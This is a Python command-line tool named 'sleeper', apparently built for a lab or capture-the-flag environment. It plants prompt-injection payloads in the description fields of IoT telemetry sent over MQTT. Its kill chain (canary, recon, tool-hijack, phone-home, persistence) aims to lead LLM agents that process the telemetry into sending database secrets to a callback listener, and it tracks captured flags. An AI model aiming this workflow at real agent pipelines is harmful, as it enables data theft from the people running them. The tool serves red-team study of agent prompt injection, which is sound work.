#!/usr/bin/env python3
"""
sleeper — IoT prompt injection attack workflow

Plant payloads in IoT telemetry pipelines, wait for LLM agents to
process them, exfiltrate secrets via persistent phone-home callback.

Kill chain:
  sleeper status            Verify the pipeline is up
  sleeper fire canary       Confirm agent has outbound HTTP
  sleeper fire recon        Discover the DB schema
  sleeper fire phone-home   Extract data to your listener
  sleeper listen check      See what came back
"""

import argparse
import json
import os
import sys
import time
import uuid
from pathlib import Path

import paho.mqtt.client as mqtt
import yaml

import config
import reporter

TEMPLATES_DIR = Path(__file__).parent / "templates"
LISTENER_URL = None  # Set from config


def get_listener_url():
    """Get the callback listener URL for API queries."""
    host = config.get("listener.host", "localhost")
    port = config.get("listener.port", "9999")
    return f"http://{host}:{port}"


def generate_correlation_id():
    """Generate a short correlation ID for tracking payloads → callbacks."""
    return uuid.uuid4().hex[:8]


# ── init ──────────────────────────────────────────────────────────

def cmd_init(args):
    """Seed SQLite config store from .properties file."""
    props_path = args.properties
    if not os.path.exists(props_path):
        print(f"ERROR: Properties file not found: {props_path}")
        sys.exit(1)

    count = config.load_properties(props_path)
    print(f"Loaded {count} config entries from {props_path}")
    print(f"Config stored in {config.DB_PATH}")


# ── config ────────────────────────────────────────────────────────

def cmd_config_set(args):
    config.set_config(args.key, args.value)
    print(f"Set {args.key} = {args.value}")


def cmd_config_get(args):
    value = config.get(args.key)
    if value:
        print(f"{args.key} = {value}")
    else:
        print(f"Key '{args.key}' not found")
        sys.exit(1)


def cmd_config_list(args):
    entries = config.get_all()
    if not entries:
        print("No config entries. Run 'init' first.")
        return
    max_key = max(len(k) for k, _ in entries)
    for key, value in entries:
        display = "****" if "password" in key.lower() else value
        print(f"  {key:<{max_key}}  {display}")


# ── status ────────────────────────────────────────────────────────

def cmd_status(args):
    """Check connectivity to all pipeline components + listener."""
    import socket

    components = [
        ("MQTT Broker", config.get("mqtt.host", "localhost"),
         int(config.get("mqtt.port", "1883"))),
        ("Kafka", config.get("kafka.bootstrap", "localhost:9092").split(":")[0],
         int(config.get("kafka.bootstrap", "localhost:9092").split(":")[-1])),
        ("PostgreSQL", config.get("db.host", "localhost"),
         int(config.get("db.port", "5432"))),
        ("Ollama", config.get("ollama.host", "localhost"),
         int(config.get("ollama.port", "11434"))),
        ("Callback Listener", config.get("listener.host", "localhost"),
         int(config.get("listener.port", "9999"))),
    ]

    print("Pipeline Status:\n")
    all_ok = True
    for name, host, port in components:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
            status = "UP"
        except (socket.timeout, ConnectionRefusedError, OSError):
            status = "DOWN"
            all_ok = False
        print(f"  {name:<20} {host}:{port:<6}  [{status}]")

    # Also check listener API if reachable
    try:
        import urllib.request
        url = f"{get_listener_url()}/api/status"
        resp = urllib.request.urlopen(url, timeout=3)
        data = json.loads(resp.read())
        print(f"\n  Listener uptime:     {data.get('uptime_human', '?')}")
        print(f"  Total callbacks:     {data.get('total_callbacks', '?')}")
        print(f"  Flags captured:      {data.get('flags_captured', '?')}")
    except Exception:
        pass

    print()
    if all_ok:
        print("All components reachable.")
        print("\nNext: sleeper fire canary")
    else:
        print("Some components are down. Start the lab:")
        print("  docker compose up -d")


# ── fire (scenarios) ──────────────────────────────────────────────

def cmd_fire_list(args):
    """List available attack scenarios."""
    if not TEMPLATES_DIR.exists():
        print("No templates directory found")
        sys.exit(1)

    templates = sorted(TEMPLATES_DIR.glob("*.yaml"))
    if not templates:
        print("No scenario templates found")
        return

    # Define kill-chain order
    order = {"canary": 0, "recon": 1, "basic-exfil": 2, "tool-hijack": 3,
             "phone-home": 4, "blind-oob": 5, "persistence": 6}

    scenarios = []
    for path in templates:
        with open(path) as f:
            data = yaml.safe_load(f)
        scenarios.append(data)

    # Sort by kill-chain order, then alphabetically
    scenarios.sort(key=lambda s: (order.get(s.get("id", ""), 99), s.get("id", "")))

    print(f"Attack Scenarios ({len(scenarios)}):\n")
    print(f"  {'ID':<20} {'DIFFICULTY':<12} NAME")
    print(f"  {'─' * 20} {'─' * 12} {'─' * 30}")
    for s in scenarios:
        sid = s.get("id", "?")
        diff = s.get("difficulty", "?")
        name = s.get("name", "Unnamed")
        print(f"  {sid:<20} {diff:<12} {name}")

    print(f"\nRun:  sleeper fire <scenario-id>")
    print(f"Recommended order: canary → recon → phone-home")


def cmd_fire_run(args):
    """Run a specific attack scenario with correlation tracking."""
    scenario_id = args.scenario_id

    # Find template by ID or filename
    template_path = None
    for path in TEMPLATES_DIR.glob("*.yaml"):
        with open(path) as f:
            data = yaml.safe_load(f)
        if data.get("id") == scenario_id or path.stem == scenario_id:
            template_path = path
            break

    if not template_path:
        print(f"ERROR: Scenario '{scenario_id}' not found")
        print("Run 'fire list' to see available scenarios")
        sys.exit(1)

    with open(template_path) as f:
        scenario = yaml.safe_load(f)

    cid = generate_correlation_id()
    print(f"Scenario:       {scenario['name']}")
    print(f"Correlation ID: {cid}")
    print(f"Difficulty:     {scenario.get('difficulty', '?')}")
    print()

    # Show intent
    desc = scenario.get("description", "").strip()
    intent_line = desc.split("\n")[0] if desc else "N/A"
    print(f"Intent: {intent_line}")
    print()

    topic = scenario.get("topic", "iot/telemetry/temperature")

    # Handle single payload
    if "payload" in scenario:
        payload = dict(scenario["payload"])
        _inject_payload(topic, payload, cid)

    # Handle multiple payloads (phone-home, persistence)
    if "payloads" in scenario:
        for i, payload in enumerate(scenario["payloads"], 1):
            payload = dict(payload)
            print(f"  Payload {i}/{len(scenario['payloads'])}:")
            _inject_payload(topic, payload, cid)

    # Handle follow-up payloads (persistence scenario)
    if "follow_up_payloads" in scenario:
        print("  Sending follow-up payloads...")
        for i, payload in enumerate(scenario["follow_up_payloads"], 1):
            payload = dict(payload)
            _inject_payload(topic, payload, cid)
            time.sleep(0.5)

    # Next steps
    print()
    expected = scenario.get("expected_flag", "")
    phone_home = scenario.get("phone_home_url", "")

    if phone_home or scenario_id in ("canary", "phone-home"):
        print(f"Waiting for callback... Check with:")
        print(f"  sleeper listen check")
    elif expected:
        print(f"Expected flag: {expected}")
        print(f"Watch agent logs:")
        print(f"  sleeper watch")
    else:
        print(f"Watch agent logs:")
        print(f"  sleeper watch")


def _inject_payload(topic, payload, cid):
    """Inject a single payload, appending correlation ID to callback URLs."""
    # If the description contains a callback URL, append correlation ID
    desc = payload.get("description", "")
    if "callback-listener" in desc and "_cid=" not in desc:
        # Append correlation ID to the callback URL
        desc = desc.replace(
            "callback-listener:9999/",
            f"callback-listener:9999/"
        )
        # Add correlation as a query param hint in the description
        if "?" in desc and "callback-listener" in desc:
            desc = desc.replace("?", f"?_cid={cid}&", 1)
        payload["description"] = desc

    publish_mqtt(topic, payload)


# ── inject (custom) ──────────────────────────────────────────────

def cmd_inject(args):
    """Inject a custom payload via MQTT."""
    topic = args.topic or config.get("mqtt.default_topic", "iot/telemetry/temperature")
    cid = generate_correlation_id()

    if args.template:
        with open(args.template) as f:
            payload = json.load(f)
    elif args.payload:
        payload = {
            "sensor_id": args.sensor_id or f"INJECT-{int(time.time()) % 10000:04d}",
            "value": args.value or 0.0,
            "unit": args.unit or "n/a",
            "description": args.payload,
        }
    else:
        print("ERROR: Provide --payload <string> or --template <file>")
        sys.exit(1)

    print(f"Correlation ID: {cid}")
    publish_mqtt(topic, payload)
    print(f"\nNext: sleeper listen check  (if expecting phone-home)")
    print(f"      sleeper watch         (to monitor agent logs)")


# ── listen ────────────────────────────────────────────────────────

def cmd_listen_status(args):
    """Show listener status and uptime."""
    import urllib.request

    try:
        url = f"{get_listener_url()}/api/status"
        resp = urllib.request.urlopen(url, timeout=5)
        data = json.loads(resp.read())
    except Exception as exc:
        print(f"ERROR: Cannot reach listener at {get_listener_url()}")
        print(f"  {exc}")
        print(f"\nIs the lab running?  docker compose up -d")
        sys.exit(1)

    print("Callback Listener Status:\n")
    print(f"  Uptime:          {data.get('uptime_human', '?')}")
    print(f"  Total callbacks: {data.get('total_callbacks', 0)}")
    print(f"  Flags captured:  {data.get('flags_captured', 0)}")
    last = data.get("last_callback")
    print(f"  Last callback:   {last or 'none'}")


def cmd_listen_check(args):
    """Show recent callbacks from the listener."""
    import urllib.request

    try:
        limit = args.last if hasattr(args, "last") and args.last else 20
        url = f"{get_listener_url()}/api/callbacks?limit={limit}"
        resp = urllib.request.urlopen(url, timeout=5)
        callbacks = json.loads(resp.read())
    except Exception as exc:
        print(f"ERROR: Cannot reach listener at {get_listener_url()}")
        print(f"  {exc}")
        sys.exit(1)

    if not callbacks:
        print("No callbacks received yet.")
        print("Listener is waiting for phone-home connections...")
        return

    print(f"Callbacks ({len(callbacks)} most recent):\n")

    flags_found = []
    for cb in reversed(callbacks):  # Show oldest first
        ts = cb.get("received_at", "?")
        method = cb.get("method", "?")
        path = cb.get("path", "?")
        cid = cb.get("correlation_id", "")
        flag = cb.get("flag_found")
        params = cb.get("query_params")

        # Format timestamp
        if "T" in ts:
            ts = ts.split("T")[1].split(".")[0] + " UTC"

        line = f"  [{ts}] {method} {path}"
        if cid:
            line += f"  (cid: {cid})"
        print(line)

        if params and params != "{}":
            try:
                p = json.loads(params)
                for k, v in p.items():
                    print(f"           {k} = {v[0] if isinstance(v, list) else v}")
            except (json.JSONDecodeError, TypeError):
                pass

        if flag:
            print(f"           FLAG: {flag}")
            flags_found.append(flag)

    if flags_found:
        print()
        print("=" * 50)
        for f in flags_found:
            print(f"  CAPTURED: {f}")
        print("=" * 50)


def cmd_listen_clear(args):
    """Clear all stored callbacks."""
    import urllib.request

    try:
        req = urllib.request.Request(
            f"{get_listener_url()}/api/callbacks",
            method="DELETE",
        )
        resp = urllib.request.urlopen(req, timeout=5)
        data = json.loads(resp.read())
        print(f"Cleared {data.get('cleared', 0)} callbacks.")
    except Exception as exc:
        print(f"ERROR: Cannot reach listener: {exc}")
        sys.exit(1)


# ── watch ─────────────────────────────────────────────────────────

def cmd_watch(args):
    """Watch agent logs for FLAG pattern."""
    container = args.container or "sleeper-cell-vulnerable-agent-1"
    reporter.watch_logs(container_name=container, timeout=args.timeout)


# ── MQTT publishing ──────────────────────────────────────────────

def publish_mqtt(topic: str, payload: dict):
    """Publish a JSON payload to the MQTT broker."""
    host = config.get("mqtt.host", "localhost")
    port = int(config.get("mqtt.port", "1883"))

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)

    try:
        client.connect(host, port, keepalive=60)
    except ConnectionRefusedError:
        print(f"ERROR: Cannot connect to MQTT broker at {host}:{port}")
        print("Is the lab running?  docker compose up -d")
        sys.exit(1)
    except OSError as exc:
        print(f"ERROR: MQTT connection failed: {exc}")
        sys.exit(1)

    message = json.dumps(payload)
    result = client.publish(topic, message, qos=1)
    result.wait_for_publish()
    client.disconnect()

    print(f"  Published to {topic}")
    # Show payload with injection highlighted
    desc = payload.get("description", "")
    if len(desc) > 120:
        desc = desc[:120] + "..."
    for k, v in payload.items():
        if k == "description":
            print(f"    {k}: {desc}")
        else:
            print(f"    {k}: {v}")


# ── CLI entrypoint ────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="sleeper",
        description="sleeper — IoT prompt injection attack workflow",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
kill chain:
  sleeper status                 Check pipeline connectivity
  sleeper fire canary            Confirm agent has outbound HTTP
  sleeper fire recon             Discover the DB schema
  sleeper fire phone-home        Extract data to callback listener
  sleeper listen check           See what came back

other:
  sleeper fire list              List all attack scenarios
  sleeper inject --payload "..." Custom injection
  sleeper watch                  Monitor agent logs for FLAG
  sleeper config list            Show configuration
        """,
    )
    subparsers = parser.add_subparsers(dest="command", help="Commands")

    # init
    p_init = subparsers.add_parser("init", help="Seed config from .properties file")
    p_init.add_argument("--properties", default=".properties",
                        help="Path to .properties file (default: .properties)")
    p_init.set_defaults(func=cmd_init)

    # status
    p_status = subparsers.add_parser("status", help="Check pipeline connectivity")
    p_status.set_defaults(func=cmd_status)

    # fire (attack scenarios)
    p_fire = subparsers.add_parser("fire", help="Run attack scenarios")
    fire_sub = p_fire.add_subparsers(dest="fire_command")

    p_fire_list = fire_sub.add_parser("list", help="List available scenarios")
    p_fire_list.set_defaults(func=cmd_fire_list)

    # All scenario IDs as direct subcommands of fire
    if TEMPLATES_DIR.exists():
        for path in sorted(TEMPLATES_DIR.glob("*.yaml")):
            try:
                with open(path) as f:
                    data = yaml.safe_load(f)
                sid = data.get("id", path.stem)
                name = data.get("name", "")
                p_sc = fire_sub.add_parser(sid, help=name)
                p_sc.set_defaults(func=cmd_fire_run, scenario_id=sid)
            except Exception:
                pass

    # Fallback: fire <scenario_id> for unlisted scenarios
    p_fire_run = fire_sub.add_parser("run", help="Run a scenario by ID")
    p_fire_run.add_argument("scenario_id", help="Scenario ID")
    p_fire_run.set_defaults(func=cmd_fire_run)

    # inject (custom payload)
    p_inject = subparsers.add_parser("inject", help="Inject a custom payload via MQTT")
    p_inject.add_argument("--payload", help="Injection string (goes into description)")
    p_inject.add_argument("--template", help="JSON file with full payload")
    p_inject.add_argument("--topic", help="MQTT topic (default from config)")
    p_inject.add_argument("--sensor-id", dest="sensor_id", help="Sensor ID")
    p_inject.add_argument("--value", type=float, help="Sensor value")
    p_inject.add_argument("--unit", help="Unit")
    p_inject.set_defaults(func=cmd_inject)

    # listen (callback listener interaction)
    p_listen = subparsers.add_parser("listen", help="Query the callback listener")
    listen_sub = p_listen.add_subparsers(dest="listen_command")

    p_listen_status = listen_sub.add_parser("status", help="Listener uptime and stats")
    p_listen_status.set_defaults(func=cmd_listen_status)

    p_listen_check = listen_sub.add_parser("check", help="Show recent callbacks")
    p_listen_check.add_argument("--last", type=int, default=20,
                                help="Number of callbacks to show (default: 20)")
    p_listen_check.set_defaults(func=cmd_listen_check)

    p_listen_clear = listen_sub.add_parser("clear", help="Clear all stored callbacks")
    p_listen_clear.set_defaults(func=cmd_listen_clear)

    # watch (agent logs)
    p_watch = subparsers.add_parser("watch", help="Watch agent logs for FLAG pattern")
    p_watch.add_argument("--container", help="Docker container name")
    p_watch.add_argument("--timeout", type=int, default=0,
                         help="Stop after N seconds (0=forever)")
    p_watch.set_defaults(func=cmd_watch)

    # config
    p_config = subparsers.add_parser("config", help="Manage configuration")
    config_sub = p_config.add_subparsers(dest="config_command")

    p_config_set = config_sub.add_parser("set", help="Set a config value")
    p_config_set.add_argument("key")
    p_config_set.add_argument("value")
    p_config_set.set_defaults(func=cmd_config_set)

    p_config_get = config_sub.add_parser("get", help="Get a config value")
    p_config_get.add_argument("key")
    p_config_get.set_defaults(func=cmd_config_get)

    p_config_list = config_sub.add_parser("list", help="List all config")
    p_config_list.set_defaults(func=cmd_config_list)

    # ── Keep old 'scenarios' as alias for 'fire' ──
    p_scenarios = subparsers.add_parser("scenarios", help="(alias for 'fire')")
    scenarios_sub = p_scenarios.add_subparsers(dest="scenarios_command")
    p_sc_list = scenarios_sub.add_parser("list", help="List scenarios")
    p_sc_list.set_defaults(func=cmd_fire_list)
    p_sc_run = scenarios_sub.add_parser("run", help="Run a scenario")
    p_sc_run.add_argument("scenario_id")
    p_sc_run.set_defaults(func=cmd_fire_run)

    # Parse and dispatch
    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(0)

    if hasattr(args, "func"):
        args.func(args)
    else:
        sub = {
            "fire": p_fire, "listen": p_listen,
            "config": p_config, "scenarios": p_scenarios,
        }
        sub.get(args.command, parser).print_help()


if __name__ == "__main__":
    main()
